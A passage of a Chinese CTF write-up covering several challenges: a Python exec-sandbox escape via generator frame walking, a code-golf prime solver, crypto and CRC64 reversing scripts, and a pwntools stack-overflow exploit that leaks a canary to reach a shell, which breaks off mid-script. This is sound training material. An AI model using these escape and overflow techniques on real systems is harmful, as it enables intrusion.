<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def b():</span></span><br><span class="line"><span class="string">    def a():yield g.gi_frame.f_back.f_back.f_back.f_back</span></span><br><span class="line"><span class="string">    g=a();g=[x for x in g][0];return g.f_globals[&#x27;BOX&#x27;]</span></span><br><span class="line"><span class="string">s=b()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">&quot;def b():\n def a():yield g.gi_frame.f_back.f_back.f_back.f_back\n g=a();g=[x for x in g][0];return g.f_globals[&#x27;BOX&#x27;]\ns=b()&quot;</span></span><br><span class="line">p = base64.b64encode(m.encode())</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(m))</span><br></pre></td></tr></table></figure>

<p>基于栈帧沙箱逃逸，通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表。</p>
<h2 id="gofl-revenge"><a href="#gofl-revenge" class="headerlink" title="gofl revenge"></a>gofl revenge</h2><p><strong>[题目writeup]：</strong></p>
<details class="toggle" ><summary class="toggle-button" style="">点击展开原题代码python文件</summary><div class="toggle-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">BOX = [</span><br><span class="line">    <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>,</span><br><span class="line">    <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>, <span class="number">227</span>, <span class="number">229</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">251</span>, <span class="number">257</span>,</span><br><span class="line">    <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>,</span><br><span class="line">    <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>, <span class="number">379</span>, <span class="number">383</span>, <span class="number">389</span>, <span class="number">397</span>, <span class="number">401</span>,</span><br><span class="line">    <span class="number">409</span>, <span class="number">419</span>, <span class="number">421</span>, <span class="number">431</span>, <span class="number">433</span>, <span class="number">439</span>, <span class="number">443</span>, <span class="number">449</span>, <span class="number">457</span>, <span class="number">461</span>, <span class="number">463</span>, <span class="number">467</span>,</span><br><span class="line">    <span class="number">479</span>, <span class="number">487</span>, <span class="number">491</span>, <span class="number">499</span>, <span class="number">503</span>, <span class="number">509</span>, <span class="number">521</span>, <span class="number">523</span>, <span class="number">541</span>, <span class="number">547</span>, <span class="number">557</span>, <span class="number">563</span>,</span><br><span class="line">    <span class="number">569</span>, <span class="number">571</span>, <span class="number">577</span>, <span class="number">587</span>, <span class="number">593</span>, <span class="number">599</span>, <span class="number">601</span>, <span class="number">607</span>, <span class="number">613</span>, <span class="number">617</span>, <span class="number">619</span>, <span class="number">631</span>,</span><br><span class="line">    <span class="number">641</span>, <span class="number">643</span>, <span class="number">647</span>, <span class="number">653</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">677</span>, <span class="number">683</span>, <span class="number">691</span>, <span class="number">701</span>, <span class="number">709</span>,</span><br><span class="line">    <span class="number">719</span>, <span class="number">727</span>, <span class="number">733</span>, <span class="number">739</span>, <span class="number">743</span>, <span class="number">751</span>, <span class="number">757</span>, <span class="number">761</span>, <span class="number">769</span>, <span class="number">773</span>, <span class="number">787</span>, <span class="number">797</span>,</span><br><span class="line">    <span class="number">809</span>, <span class="number">811</span>, <span class="number">821</span>, <span class="number">823</span>, <span class="number">827</span>, <span class="number">829</span>, <span class="number">839</span>, <span class="number">853</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">863</span>, <span class="number">877</span>,</span><br><span class="line">    <span class="number">881</span>, <span class="number">883</span>, <span class="number">887</span>, <span class="number">907</span>, <span class="number">911</span>, <span class="number">919</span>, <span class="number">929</span>, <span class="number">937</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">953</span>, <span class="number">967</span>,</span><br><span class="line">    <span class="number">971</span>, <span class="number">977</span>, <span class="number">983</span>, <span class="number">991</span>, <span class="number">997</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Give me your solve:&#x27;</span>)</span><br><span class="line">user_input = <span class="built_in">input</span>().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    user_code = base64.b64decode(user_input).decode()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid base64 input&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(user_code) &lt;= <span class="number">46</span>, <span class="string">&quot;Input exceeds maximum allowed length&quot;</span></span><br><span class="line"></span><br><span class="line">exec_globals = &#123;</span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>: <span class="literal">None</span> </span><br><span class="line">&#125;</span><br><span class="line">exec_locals = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">exec</span>(user_code, exec_globals, exec_locals)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s = exec_locals.get(<span class="string">&#x27;s&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> s == BOX:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div></details>

<p>46字符内生成1000以内的质数</p>
<p>就是用一些python的技巧就好了，有大概两个字符的容错(最低大概44个字符左右)</p>
<p>这里仅仅给出46个字符的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k,P,*s=<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line"><span class="keyword">while</span> k&lt;<span class="number">1e3</span>:s+=P%k*[k];P*=k*k;k+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后改一下弄成base64就好了</p>
<p>如何造出这个代码，我们先写一个正常的生成1000以内质数的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="number">1</span></span><br><span class="line">P = <span class="number">1</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> P % k != <span class="number">0</span>:</span><br><span class="line">        s.append(k)</span><br><span class="line">        P*=k*k</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<p>然后通过Unpacking assignment可以把</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="number">1</span></span><br><span class="line">P = <span class="number">1</span></span><br><span class="line">s = []</span><br></pre></td></tr></table></figure>

<p>写成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k,P,*s=<span class="number">1</span>,<span class="number">1</span>,</span><br></pre></td></tr></table></figure>

<p>然后对于后面的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> P % k != <span class="number">0</span>:</span><br><span class="line">        s.append(P)</span><br><span class="line">        P*=k</span><br></pre></td></tr></table></figure>

<p>我们可以用while来代替for这样子可以保证字符更少，然后把1000用1e3表示，即</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> k&lt;<span class="number">1e3</span>:</span><br><span class="line">    <span class="keyword">if</span> P % k != <span class="number">0</span>:</span><br><span class="line">        s.append(P)</span><br><span class="line">        P*=k</span><br><span class="line">    k+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>而对于中间的判断，!&#x3D;可以用&gt;来减少一个字符，然后去掉if用布尔短路解决即P%k&gt;0 and s.append(k)，但是这样子还是不够。</p>
<p>我们知道如果list加上一个空集是不会变化的，那么我们可以写成s+&#x3D;P%k*[k]，这样子s要嘛加上[质数]，要嘛加上空集</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = base64.b64encode(<span class="string">b&quot;k,P,*s=1,1,\nwhile k&lt;1e3:s+=P%k*[k];P*=k*k;k+=1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(base64.b64decode(s)))</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment"># ayxQLCpzPTEsMSwKd2hpbGUgazwxZTM6cys9UCVrKltrXTtQKj1rKms7ays9MQ==</span></span><br></pre></td></tr></table></figure>

<h2 id="right-data"><a href="#right-data" class="headerlink" title="right_data"></a>right_data</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/right_data_704f78059721ed957290705096da1564.zip" title="点击下载题文件"><span>点击下载题文件</span></a>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">modulus = <span class="number">257</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, j</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>((modulus - <span class="number">1</span>) ** <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (i * coefs1[t] + j * coefs2[t]) % modulus == values[t]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findflag</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, modulus):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, modulus):</span><br><span class="line">            <span class="keyword">if</span> find(i, j):</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">chr</span>((j - i) % modulus)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">0</span>, <span class="number">42</span>):</span><br><span class="line">        coefs1 = []</span><br><span class="line">        coefs2 = []</span><br><span class="line">        values = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((modulus - <span class="number">1</span>) ** <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">            s = f.readline().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            coefs1.append(<span class="built_in">int</span>(s[<span class="number">0</span>]))</span><br><span class="line">            coefs2.append(<span class="built_in">int</span>(s[<span class="number">1</span>]))</span><br><span class="line">            values.append(<span class="built_in">int</span>(s[<span class="number">2</span>]))</span><br><span class="line">        flag += findflag()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>flag{087834ea-dcbf-488a-a713-e496b3130d40}</p>
<h2 id="cpy"><a href="#cpy" class="headerlink" title="cpy"></a>cpy</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/gift_fca30ce0b9d3dc56bfa86cab8db126a5.zip" title="点击下载题文件"><span>点击下载题文件</span></a>



<p>ida根据字符串定位check函数，attach后动调</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e3000917ec.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e301618b95.webp"></p>
<p>看到长度判断，确定flag长度为40</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e307d833ac.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e307d83399.webp"></p>
<p>创建了两个数组，一个长度为5，一个为4</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e30b8d9693.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e30b8d96c7.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e30b8d96a2.webp"></p>
<p>从内存中取出对应的值(注意python虚拟机中每32bit只存放30bit，取出来的数得自行转换一下)</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xfbbc7f84591ff393</span>, <span class="number">0x360c751ee6bd9abd</span>, <span class="number">0x60854fc80d82350a</span>, <span class="number">0x139692ebf3ee3c4f</span>, <span class="number">0x8571b17650a42bd4</span>]</span><br><span class="line">[<span class="number">0xf656460d</span>, <span class="number">0xda144260</span>, <span class="number">0xeef1c943</span>, <span class="number">0xe4390f66</span>]</span><br></pre></td></tr></table></figure>

<p>将输入转化成ascii数组</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c6652d6.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c667ebb.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c664707.webp"></p>
<p>用int.from_bytes将ascii数组转化成八字节的数组</p>
<p>然后是加密过程，遍历上面的八字节数组</p>
<p>右移62位，相当于取了高2个字节</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c661537.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c66a277.webp"></p>
<p>原数据又移两位，然后&amp;0xffffffffffffffff</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c6795f6.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c66cd9c.webp"></p>
<p>根据高2位从四字节数组中取出一个数后和待加密数据进行异或</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c66f4fe.webp"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e31c665cc2.webp"></p>
<p>此时我们可以看出这是个魔改的crc64，加密轮数为32轮，跟到比较可以看到长度为5的数组是密文</p>
<p>还原加密算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">	idx = data &gt;&gt; <span class="number">62</span></span><br><span class="line">	data &lt;&lt;= <span class="number">2</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">	data &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">	data ^= key[idx]</span><br></pre></td></tr></table></figure>

<p>根据crc64的原理，我们可以发现key的低2位是不一样的，根据此解密拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">datas</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(datas)):</span><br><span class="line">        data=datas[j]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            low=data&amp;<span class="number">0b11</span></span><br><span class="line">            <span class="keyword">if</span> low==<span class="number">0</span>:</span><br><span class="line">                data^=<span class="number">0xda144260</span></span><br><span class="line">                data&gt;&gt;=<span class="number">2</span></span><br><span class="line">                data|=(<span class="number">1</span>&lt;&lt;<span class="number">62</span>)</span><br><span class="line">            <span class="keyword">if</span> low==<span class="number">3</span>:</span><br><span class="line">                data ^= <span class="number">0xeef1c943</span></span><br><span class="line">                data &gt;&gt;= <span class="number">2</span></span><br><span class="line">                data |= (<span class="number">2</span> &lt;&lt; <span class="number">62</span>)</span><br><span class="line">            <span class="keyword">if</span> low==<span class="number">1</span>:</span><br><span class="line">                data ^= <span class="number">0xf656460d</span></span><br><span class="line">                data &gt;&gt;= <span class="number">2</span></span><br><span class="line">                data |= (<span class="number">0</span> &lt;&lt; <span class="number">62</span>)</span><br><span class="line">            <span class="keyword">if</span> low==<span class="number">2</span>:</span><br><span class="line">                data ^= <span class="number">0xe4390f66</span></span><br><span class="line">                data &gt;&gt;= <span class="number">2</span></span><br><span class="line">                data |= (<span class="number">3</span> &lt;&lt; <span class="number">62</span>)</span><br><span class="line">        datas[j]=data</span><br><span class="line">    <span class="keyword">return</span> datas</span><br><span class="line">enc = [<span class="number">0xfbbc7f84591ff393</span>, <span class="number">0x360c751ee6bd9abd</span>, <span class="number">0x60854fc80d82350a</span>, <span class="number">0x139692ebf3ee3c4f</span>, <span class="number">0x8571b17650a42bd4</span>]</span><br><span class="line">flag=decrypt(enc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(i).decode()[::-<span class="number">1</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{131d48c0-b255-e996-ae74-bc43426ea6}</p>
<h2 id="easy-http"><a href="#easy-http" class="headerlink" title="easy_http"></a>easy_http</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/easy_http.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>选手首先需要逆向得到数据格式。</p>
<p>通过部分逆向的源码或者猜测，判断出主函数通过<code>fork</code>函数来不断产生子进程，并在子进程上进行各种操作</p>
<p>若选手没有注意到操作发生在子进程，则可能误认为考察点在于堆上的<code>UAF</code>；而子进程相互隔离，因此不可能通过堆上来进行利用。</p>
<p>构造好简易<code>http</code>数据包，要求如下：</p>
<ul>
<li><code>Host</code></li>
<li><code>Content</code></li>
<li><code>Content-Length</code></li>
</ul>
<p>此外，每个参数还具有不同的要求，包括最大值等。</p>
<p>而校验时，错误使用了<code>&amp;&amp;</code>和<code>||</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!valid_host &amp;&amp; !valid_length &amp;&amp; !valid_content)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>导致只要三个属性中有一个满足要求即可。</p>
<p>又：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcpy(real_content, content, length);</span><br></pre></td></tr></table></figure>

<p>因此合理控制<code>content-length</code>和<code>content</code>，有一个几乎无限制的栈溢出。</p>
<p>随后，通过校验后，有如下几个路由，代表几个不同的功能：</p>
<ul>
<li><code>show</code></li>
<li><code>add</code></li>
<li><code>delete</code></li>
<li><code>edit</code></li>
</ul>
<p>里面存在<code>UAF</code>，但无法利用。</p>
<p>选手需要排除干扰，通过多次栈溢出来获得<code>shell</code>。</p>
<p>因此，构造两个数据包，第一个泄露<code>canary</code>，第二个<code>rop</code>拿下<code>shell</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;neww&#x27;</span>]</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">all_logs = []</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(filename)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">params=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> an_log <span class="keyword">in</span> all_logs:</span><br><span class="line">        success(an_log)</span><br><span class="line">    pid = util.proc.pidof(sh)[<span class="number">0</span>]</span><br><span class="line">    gdb.attach(pid+<span class="number">2</span>, params)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;POST /&#123;&#125; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: www.baidu.com\r</span></span><br><span class="line"><span class="string">User-Agent: Haha\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">Content: &#123;&#125;\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = template.<span class="built_in">format</span>(<span class="string">&quot;show&quot;</span>, <span class="number">0x109</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x109</span>)</span><br><span class="line">canary = u64(sh.recv(<span 